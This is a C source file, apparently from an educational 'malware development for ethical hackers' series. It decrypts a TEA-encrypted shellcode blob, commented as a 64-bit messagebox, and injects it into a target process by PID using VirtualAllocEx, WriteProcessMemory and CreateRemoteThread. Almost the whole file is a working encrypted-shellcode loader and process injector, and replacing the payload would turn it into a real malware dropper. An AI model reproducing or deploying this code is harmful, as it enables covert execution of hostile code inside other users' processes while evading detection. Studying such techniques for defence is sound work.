/*
 * Malware Development for Ethical Hackers
 * hack.c - encrypt and decrypt shellcode via TEA. 
 * C++ implementation
 * author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define KEY_SIZE 16
#define ROUNDS 32

void decryptUsingTEA(unsigned char *data, unsigned char *key) {
  unsigned int i;
  unsigned char x = 0;

  unsigned int delta = 0x9e3779b9;
  unsigned int sum = delta * ROUNDS;

  unsigned int v0 = *(unsigned int *)data;
  unsigned int v1 = *(unsigned int *)(data + 4);

  for (i = 0; i < ROUNDS; i++) {
    v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + ((unsigned int *)key)[(sum >> 11) & 3]);
    sum -= delta;
    v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + ((unsigned int *)key)[sum & 3]);
  }

  *(unsigned int *)data = v0;
  *(unsigned int *)(data + 4) = v1;
}

int main(int argc, char* argv[]) {
  unsigned char decryptionKey[] = "\x6d\x65\x6f\x77\x6d\x65\x6f\x77\x6d\x65\x6f\x77\x6d\x65\x6f\x77";
  unsigned char encryptedPayload[] =
  // 64-bit meow-meow messagebox
  "\x6a\xf5\x79\xa8\x12\xca\x83\xce\xdc\x69\xa4\x59\x68\x54\xb8\xc7"
  "\xd2\x63\x35\xc2\xcb\xe1\x24\xbb\xd5\x43\x36\x98\x37\x13\x91\xe0"
  "\xc6\xe1\x01\x7a\x2a\xe1\xd8\x51\xfc\x73\x4f\x74\x1d\x33\x84\x5d"
  "\xdd\x30\x13\xda\xd9\x86\xf4\x44\x84\x40\x40\xea\xc9\x10\x79\xb2"
  "\xc1\x4b\x4b\x3f\xf3\x34\x20\x25\x75\x09\x64\x46\x91\xff\xa3\xea"
  "\x49\x53\xaf\x87\x7b\x9b\xaa\x20\xfd\x42\x5e\xf7\xf4\xc8\x3d\x52"
  "\xde\x19\x90\x67\x71\xb7\xa1\xbf\x17\xb1\xa8\xd0\x00\x31\x8d\x57"
  "\x74\xcb\xf9\x8f\x02\xe8\x6d\x1b\x4d\xaf\x60\x3d\x3a\x01\x33\x87"
  "\xf9\xc2\xf4\x93\xec\xdd\x89\x89\x80\x36\xc1\x2a\x73\xc7\x67\x04"
  "\x7a\x82\x25\x62\xf1\xe1\x98\x01\x8a\x56\x4b\x87\x85\x89\xd0\xf4"
  "\x00\x2a\xcd\xf6\xbf\x59\xeb\x0a\x7b\x86\xe6\xc8\x81\xfa\x2c\x5f"
  "\x91\x2a\x13\x11\x31\xc4\xe0\x34\x6f\x20\xa0\x07\x65\x01\x82\x5b"
  "\x88\x05\x2d\x19\x16\x48\x64\xc9\x21\x26\xda\xf0\xc1\xff\x10\x13"
  "\x6d\x70\x66\xa4\x42\x1e\x4c\x4c\xd1\xc3\xe1\x2e\xd2\xc7\xac\x85"
  "\xc8\xfc\x75\xaa\xff\x9f\xcb\x1c\x79\x8d\x8f\xd3\x2d\x8b\x4d\x9d"
  "\x59\x60\xf2\xf9\x0b\x32\xa8\x94\xb4\x1e\x2b\x9c\xcd\x31\x97\x94"
  "\x67\x17\xfd\xd9\xcf\x38\xb0\x82\x27\x34\x72\x4f\xa6\x4b\x6b\x96"
  "\x54\x66\x00\xcf\x1e\x49\x1c\x5e\x60\xea\xfa\x26\x60\x97\xe7\xf9"
  "\x8b\x5d\x1a\x60\x11\x12\xf7\xde\xea\x9a\x15\xc1\x25\x90\x66\xe6"
  "\xc3\x6e\xbc\xd7\x30\x85\x28\xe1\xa6\x08\xac\x1d\x3d\x13\x3f\x7a";

  HANDLE processHandle; // process handle
  HANDLE remoteThread; // remote thread
  PVOID remoteBuffer; // remote buffer

  // tea_decrypt(encryptedPayload, decryptionKey);
  for (int i = 0; i < sizeof(encryptedPayload); i += 8) {
    decryptUsingTEA(&encryptedPayload[i], decryptionKey);
  }

  printf("decrypted:\n");
  for (int i = 0; i < sizeof(encryptedPayload); i++) {
    printf("\\x%02x", encryptedPayload[i]);
  }
  printf("\n\n");

  // parse process ID
  printf("PID: %i", atoi(argv[1]));
  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));

  // allocate memory buffer for remote process
  remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(encryptedPayload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" data between processes
  WriteProcessMemory(processHandle, remoteBuffer, encryptedPayload, sizeof(encryptedPayload), NULL);

  // our process starts a new thread
  remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  CloseHandle(processHandle);
  return 0;
}